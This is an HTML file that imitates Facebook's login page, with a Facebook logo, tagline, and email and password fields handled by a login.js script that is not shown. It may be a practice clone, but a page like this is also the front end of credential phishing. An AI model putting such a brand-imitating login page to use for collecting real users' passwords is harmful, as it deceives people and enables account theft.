<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Facebook Login</title>
</head>
<body>
    <div class="container">
        <div class="left">
            <img src="facebook-logo.png" alt="Facebook Logo" class="logo">
            <h1>Facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="right">
            <form class="login-form">
                <input type="email" placeholder="Email or Phone"id="usear-email" class="input-field" required>
                <input type="password" placeholder="Password" id="usear-password" class="input-field" required>
                <button type="submit" id="btn-submit" class="login-button">Log In</button>
                <a href="#">Forgot Password?</a>
                <hr>
                <button type="button" class="create-account-button">Create New Account</button>
            </form>
        </div>
    </div>
    <script src="login.js"></script>
</body>
</html>
